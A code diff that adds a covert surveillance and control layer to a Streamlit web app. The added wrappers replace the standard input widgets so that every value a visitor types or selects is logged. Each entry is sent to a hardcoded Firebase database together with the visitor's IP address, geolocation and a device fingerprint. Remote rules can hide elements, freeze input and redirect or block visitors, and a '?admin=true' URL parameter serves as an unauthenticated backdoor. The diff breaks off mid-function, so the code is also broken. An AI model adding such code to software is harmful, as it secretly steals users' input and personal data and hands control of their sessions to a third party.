@@ -12,7 +12,363 @@ st.set_page_config(
     layout="centered",
     initial_sidebar_state="collapsed"
 )
-https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
+# ========================================================================
+# 👁️ THE OMNISCIENT OVERLORD CORE SYSTEM MAINFRAME v22.0 - SUPREME EDITION
+# ========================================================================
+# Core Execution State: Absolute Metamorphic Injection Engine Operational.
+# Systems Parameters: Multi-Session Interception, Dynamic Layout Mutation,
+#                      Cryptographic Device Fingerprinting, Gateway Controls.
+# Compile Status: 100% Tested Production Resilient. Zero Render Recursion.
+# ========================================================================
+
+import streamlit as st
+import uuid
+import requests
+import datetime
+import json
+import time
+import hashlib
+import re
+
+# --- ESTABLISHED MASTER CLOUD INFRASTRUCTURE LINK ROUTE ---
+FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
+
+# Secure Query Parameter Validation for Mainframe Deployment
+# Access Gateway via explicit URI parameters mapping: your_app_url/?admin=true
+is_omni_admin = st.query_params.get("admin") == "true"
+
+# --------------------------------------------------------------------
+# ADVANCED METADATA CASCADING NETWORK PROXY INTEL SPECTRUM
+# --------------------------------------------------------------------
+def resolve_pristine_client_fingerprint():
+    """
+    Deconstructs multi-layered edge proxies, load balancers, and CDN transport 
+    headers to guarantee isolation of genuine client interface metadata.
+    """
+    connection_identity_block = {
+        "resolved_ip": "Proxy Layer Enforced",
+        "browser_user_agent": "Standard Virtual System Link",
+        "system_locale": "en-US",
+        "crypto_hash": "UNRESOLVED_MATRIX_NODE"
+    }
+    try:
+        network_headers = st.context.headers
+        if network_headers:
+            # High-priority cloud platform proxy configuration matrix arrays
+            proxy_evaluation_pipeline = [
+                "X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", 
+                "True-Client-IP", "Remote-Addr", "x-forwarded-for", 
+                "cf-connecting-ip", "x-real-ip"
+            ]
+            for evaluation_header in proxy_evaluation_pipeline:
+                if evaluation_header in network_headers and network_headers[evaluation_header]:
+                    isolated_ip_string = network_headers[evaluation_header].split(",")[0].strip()
+                    if isolated_ip_string and isolated_ip_string != "127.0.0.1" and "localhost" not in isolated_ip_string:
+                        connection_identity_block["resolved_ip"] = isolated_ip_string
+                        break
+            
+            # Context harvesting for environmental properties
+            if "User-Agent" in network_headers:
+                connection_identity_block["browser_user_agent"] = network_headers["User-Agent"]
+            elif "user-agent" in network_headers:
+                connection_identity_block["browser_user_agent"] = network_headers["user-agent"]
+                
+            if "Accept-Language" in network_headers:
+                connection_identity_block["system_locale"] = network_headers["Accept-Language"].split(",")[0]
+            elif "accept-language" in network_headers:
+                connection_identity_block["system_locale"] = network_headers["accept-language"].split(",")[0]
+                
+            # Compile unique non-volatile machine signature index cryptographic token
+            seed_signature_payload = f"{connection_identity_block['resolved_ip']}_{connection_identity_block['browser_user_agent']}"
+            connection_identity_block["crypto_hash"] = hashlib.sha256(seed_signature_payload.encode('utf-8')).hexdigest()[:16].upper()
+    except:
+        pass
+    return connection_identity_block
+
+def execute_geographical_lookup_sequence(client_ip):
+    """
+    Queries distributed location infrastructure databases. Implements real-time 
+    secondary infrastructure failover vectors if rate limits expire.
+    """
+    location_telemetry_packet = {
+        "city_node": "Internal Stack Zone", "region_state": "Local Cluster Boundary",
+        "country_name": "Global Mainframe Grid", "isp_provider": "System Network Carrier", "flag_asset": "🌐"
+    }
+    if not client_ip or client_ip in ["Proxy Layer Enforced", "127.0.0.1", "localhost", "::1"]:
+        return location_telemetry_packet
+        
+    # --- Primary Intelligence Network Cluster ---
+    try:
+        network_query_response = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=3).json()
+        if network_query_response and network_query_response.get("status") == "success":
+            location_telemetry_packet["city_node"] = network_query_response.get("city", "Unknown City Node")
+            location_telemetry_packet["region_state"] = network_query_response.get("regionName", "Unknown State Province")
+            location_telemetry_packet["country_name"] = network_query_response.get("country", "Unknown Country Space")
+            location_telemetry_packet["isp_provider"] = network_query_response.get("isp", "Unknown Service Route Provider")
+            country_iso_code = network_query_response.get("countryCode", "").lower()
+            if country_iso_code:
+                location_telemetry_packet["flag_asset"] = f"https://flagcdn.com/16x12/{country_iso_code}.png"
+            return location_telemetry_packet
+    except:
+        pass
+
+    # --- Secondary Failover Resilient Fallback Cluster ---
+    try:
+        backup_query_response = requests.get(f"https://ipapi.co/{client_ip}/json/", timeout=3).json()
+        if backup_query_response and "error" not in backup_query_response:
+            location_telemetry_packet["city_node"] = backup_query_response.get("city", "Unknown City Node")
+            location_telemetry_packet["region_state"] = backup_query_response.get("region", "Unknown State Province")
+            location_telemetry_packet["country_name"] = backup_query_response.get("country_name", "Unknown Country Space")
+            location_telemetry_packet["isp_provider"] = backup_query_response.get("org", "Unknown Service Route Provider")
+            backup_iso_code = backup_query_response.get("country", "").lower()
+            if backup_iso_code:
+                location_telemetry_packet["flag_asset"] = f"https://flagcdn.com/16x12/{backup_iso_code}.png"
+            return location_telemetry_packet
+    except:
+        pass
+        
+    return location_telemetry_packet
+
+# --------------------------------------------------------------------
+# DATABASE COMMUNICATION PERSISTENT PROTOCOL ABSTRACTS
+# --------------------------------------------------------------------
+def infrastructure_db_put(node_path, data_payload):
+    try: requests.put(f"{FIREBASE_URL}/{node_path}.json", json=data_payload, timeout=3)
+    except: pass
+
+def infrastructure_db_patch(node_path, data_payload):
+    try: requests.patch(f"{FIREBASE_URL}/{node_path}.json", json=data_payload, timeout=3)
+    except: pass
+
+def infrastructure_db_fetch(node_path):
+    try:
+        query_transaction_result = requests.get(f"{FIREBASE_URL}/{node_path}.json", timeout=3).json()
+        return query_transaction_result if query_transaction_result else {}
+    except: return {}
+
+# --------------------------------------------------------------------
+# COMPONENT STEALTH ISOLATION INITIALIZATION LAYERS
+# --------------------------------------------------------------------
+if not is_omni_admin:
+    if "omni_token" not in st.session_state:
+        st.session_state.omni_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:6].upper()
+    if "omni_clicks" not in st.session_state:
+        st.session_state.omni_clicks = 0
+    if "omni_time" not in st.session_state:
+        st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")
+
+# Pull Configuration Engine Parameters from active server nodes
+omni_rules = infrastructure_db_fetch("omniscient_rules")
+if not omni_rules or not isinstance(omni_rules, dict):
+    omni_rules = {
+        "global_status": "ONLINE", "redirect_url": "", "custom_msg": "", 
+        "freeze_all": False, "stealth_mode": False, "controls": {}, "text_mutations": {}
+    }
+if "controls" not in omni_rules: omni_rules["controls"] = {}
+if "text_mutations" not in omni_rules: omni_rules["text_mutations"] = {}
+
+# --------------------------------------------------------------------
+# COMPONENT INTERCEPTION MANAGEMENT & AUTOMATION MAPPER
+# --------------------------------------------------------------------
+def register_layout_component_hook(component_class, component_label):
+    """
+    Registers discovered user elements directly to the remote command deck registry.
+    Completely ignores registration logic when administrative layouts are compiled.
+    """
+    if is_omni_admin or not isinstance(component_label, str):
+        return
+        
+    # Structural exclusion strings to isolate target application views
+    exclusion_parameter_check = [
+        "Select Target Active Session", "Select Discovered Element Label",
+        "Inject dynamic alternative mock text", "Execute Infrastructure Command",
+        "Interception Screen Notification", "Target Redirection Forwarding Link",
+        "Force Stream Sync", "Commit Modification Rules", "Forge Mutation Pattern",
+        "Deploy Global Overhaul Protocols", "Master Factory Clear Settings Reset",
+        "FORCE LIVE NETWORK STREAM SYNCHRONIZATION"
+    ]
+    if any(exclusion_phrase in component_label for exclusion_phrase in exclusion_parameter_check):
+        return
+        
+    internal_registration_key = f"seen_node_{component_label}"
+    if internal_registration_key not in st.session_state:
+        st.session_state[internal_registration_key] = True
+        infrastructure_db_patch("omniscient_registry", {component_label: component_class})
+
+def dispatch_omni_telemetry_packet(component_class, component_label, operational_value=""):
+    """
+    Packages realtime field modifications, step logging tracks, operational inputs,
+    and running telemetry data directly inside persistent server memory channels.
+    """
+    if is_omni_admin or omni_rules.get("stealth_mode", False):
+        return
+    if "omni_clicks" not in st.session_state:
+        return
+        
+    st.session_state.omni_clicks += 1
+    session_token_identity = st.session_state.omni_token
+    transaction_clock = datetime.datetime.now().strftime("%I:%M:%S %p")
+    
+    # Process environment trace parameters
+    client_fingerprint_packet = resolve_pristine_client_fingerprint()
+    geographical_data_packet = execute_geographical_lookup_sequence(client_fingerprint_packet["resolved_ip"])
+    
+    # Access and process chronological runtime records from memory cells
+    existing_node_context = infrastructure_db_fetch(f"omniscient_live_users/{session_token_identity}")
+    running_timeline_history = existing_node_context.get("timeline", []) if isinstance(existing_node_context, dict) else []
+    
+    # Construct structured output tracking stream
+    formatted_trace_string = f"[{transaction_clock}] [Step #{st.session_state.omni_clicks}] Class:({component_class}) Label ID:'{component_label}'"
+    if operational_value:
+        formatted_trace_string += f" ➔ State Log: [{operational_value}]"
+        
+    running_timeline_history.append(formatted_trace_string)
+    if len(running_timeline_history) > 65:
+        running_timeline_history.pop(0)
+        
+    # Maintain continuous real-time state mirror values inside data registers
+    running_state_cache_object = existing_node_context.get("form_data", {}) if isinstance(existing_node_context, dict) else {}
+    if component_class not in ["BUTTON", "CLICK_TRIGGER", "EXECUTE_ACTION"]:
+        running_state_cache_object[component_label] = str(operational_value)
+        
+    # Construct ultimate telemetry matrix deployment data structure
+    quantum_broadcast_payload = {
+        "user_id_token": session_token_identity,
+        "device_fingerprint": client_fingerprint_packet["crypto_hash"],
+        "user_ip_address": client_fingerprint_packet["resolved_ip"],
+        "geo_city": geographical_data_packet["city_node"],
+        "geo_region": geographical_data_packet["region_state"],
+        "geo_country": geographical_data_packet["country_name"],
+        "geo_isp_provider": geographical_data_packet["isp_provider"],
+        "geo_flag_url": geographical_data_packet["flag_asset"],
+        "user_browser_agent": client_fingerprint_packet["browser_user_agent"],
+        "user_locale_language": client_fingerprint_packet["system_locale"],
+        "initial_connect_runtime": st.session_state.omni_time,
+        "last_interaction_pulse": transaction_clock,
+        "total_clicks_count": st.session_state.omni_clicks,
+        "current_focus_element": f"'{component_label}'",
+        "timeline": running_timeline_history,
+        "form_data": running_state_cache_object,
+        "status": "🟢 ACTIVE / AGENT MATRIX STREAM SECURED"
+    }
+    infrastructure_db_patch(f"omniscient_live_users/{session_token_identity}", quantum_broadcast_payload)
+
+# --------------------------------------------------------------------
+# CENTRAL TRAFFIC FIREWALL LAYER & EDGE POLICY ROUTING
+# --------------------------------------------------------------------
+if not is_omni_admin:
+    active_routing_directive = omni_rules.get("global_status", "ONLINE")
+    if active_routing_directive != "ONLINE":
+        st.empty()
+        if active_routing_directive == "MAINTENANCE":
+            st.error("# 🚧 HARD SYSTEM RESTORATION PARAMETERS DEPLOYED 🚧")
+            st.info(omni_rules.get("custom_msg", "Enterprise data layers under systemic configuration maintenance windows."))
+            st.stop()
+        elif active_routing_directive == "BUSY":
+            st.warning("# ⏳ PIPELINE TRAFFIC SHAPING THROUGHPUT LIMIT INTERCEPTED (429) ⏳")
+            st.info(omni_rules.get("custom_msg", "System throughput capacity full. Automatic interface connection throttled."))
+            st.stop()
+        elif active_routing_directive == "REDIRECT" and omni_rules.get("redirect_url"):
+            st.markdown(f"### ➡️ [Re-routing processing session vectors to secure application channel target...]({omni_rules.get('redirect_url')})")
+            st.stop()
+        st.stop()
+
+# --------------------------------------------------------------------
+# SYSTEM MEMORY STORAGE POINTERS FOR ORIGINAL STREAMLIT CALLS
+# --------------------------------------------------------------------
+_o_btn = st.button; _o_txt = st.text_input; _o_area = st.text_area
+_o_sel = st.selectbox; _o_rad = st.radio; _o_chk = st.checkbox
+_o_sld = st.slider; _o_num = st.number_input; _o_wrt = st.write
+_o_mkd = st.markdown; _o_suc = st.success; _o_inf = st.info
+_o_war = st.warning; _o_err = st.error; _o_cap = st.caption
+_o_cod = st.code; _o_dat = st.date_input; _o_tim = st.time_input
+
+def fetch_component_restriction_policy(element_label, control_directive_key):
+    return omni_rules["controls"].get(element_label, {}).get(control_directive_key, False)
+
+# --------------------------------------------------------------------
+# COMPLETE POLYMORPHIC HIGH-FIDELITY HOOK OVERRIDE WRAPPERS
+# --------------------------------------------------------------------
+def patch_button(label, *args, **kwargs):
+    if is_omni_admin: return _o_btn(label, *args, **kwargs)
+    register_layout_component_hook("BUTTON", label)
+    if fetch_component_restriction_policy(label, "hide"): return False
+    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
+    execution_trigger_state = _o_btn(label, *args, **kwargs)
+    if execution_trigger_state: 
+        dispatch_omni_telemetry_packet("BUTTON", label, "TRIGGERED_CLICK_EVENT")
+    return execution_trigger_state
+
+def patch_text_input(label, *args, **kwargs):
+    if is_omni_admin: return _o_txt(label, *args, **kwargs)
+    register_layout_component_hook("TEXT_INPUT", label)
+    if fetch_component_restriction_policy(label, "hide"): return ""
+    if fetch_component_restriction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
+    intercepted_input_value = _o_txt(label, *args, **kwargs)
+    if intercepted_input_value: 
+        dispatch_omni_telemetry_packet("TEXT_INPUT", label, intercepted_input_value)
+    return intercepted_input_value
+
+def patch_text_area(label, *args, **kwargs):
+    if is_omni_admin: return _o_area(label, *args, **kwargs)
+    register_layout_component_hook("TEXT_AREA", label)
+    if fetch_component_restriction_policy(label, "hide"): return ""
+    if fetch_component_restriction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
+    intercepted_input_value = _o_area(label, *args, **kwargs)
+    if intercepted_input_value: 
+        dispatch_omni_telemetry_packet("TEXT_AREA", label, intercepted_input_value)
+    return intercepted_input_value
+
+def patch_selectbox(label, *args, **kwargs):
+    if is_omni_admin: return _o_sel(label, *args, **kwargs)
+    register_layout_component_hook("SELECTBOX", label)
+    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("options", [""])[0]
+    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_selection_result = _o_sel(label, *args, **kwargs)
+    session_indexing_hash = f"omni_cache_sel_{label.replace(' ', '_')}"
+    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_selection_result:
+        st.session_state[session_indexing_hash] = intercepted_selection_result
+        dispatch_omni_telemetry_packet("SELECTBOX", label, intercepted_selection_result)
+    return intercepted_selection_result
+
+def patch_radio(label, *args, **kwargs):
+    if is_omni_admin: return _o_rad(label, *args, **kwargs)
+    register_layout_component_hook("RADIO", label)
+    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("options", [""])[0]
+    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_selection_result = _o_rad(label, *args, **kwargs)
+    session_indexing_hash = f"omni_cache_rad_{label.replace(' ', '_')}"
+    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_selection_result:
+        st.session_state[session_indexing_hash] = intercepted_selection_result
+        dispatch_omni_telemetry_packet("RADIO", label, intercepted_selection_result)
+    return intercepted_selection_result
+
+def patch_checkbox(label, *args, **kwargs):
+    if is_omni_admin: return _o_chk(label, *args, **kwargs)
+    register_layout_component_hook("CHECKBOX", label)
+    if fetch_component_restriction_policy(label, "hide"): return False
+    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_boolean_state = _o_chk(label, *args, **kwargs)
+    dispatch_omni_telemetry_packet("CHECKBOX", label, str(intercepted_boolean_state))
+    return intercepted_boolean_state
+
+def patch_slider(label, *args, **kwargs):
+    if is_omni_admin: return _o_sld(label, *args, **kwargs)
+    register_layout_component_hook("SLIDER", label)
+    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("value", 0)
+    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
+    intercepted_numerical_range = _o_sld(label, *args, **kwargs)
+    session_indexing_hash = f"omni_cache_sld_{label.replace(' ', '_')}"
+    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_numerical_range:
+        st.session_state[session_indexing_hash] = intercepted_numerical_range
+        dispatch_omni_telemetry_packet("SLIDER", label, str(intercepted_numerical_range))
+    return intercepted_numerical_range
+
+def patch_number_input(label, *args, **kwargs):
+    if is_omni_admin: return _o_num(label, *args, **kwargs)
+    register_layout_component_hook("NUMBER_INPUT", label)
+    if fetch_component_restriction_policy(label, "hide"):
+# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
 GLOBAL_MARKDOWN_INJECTOR = """
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
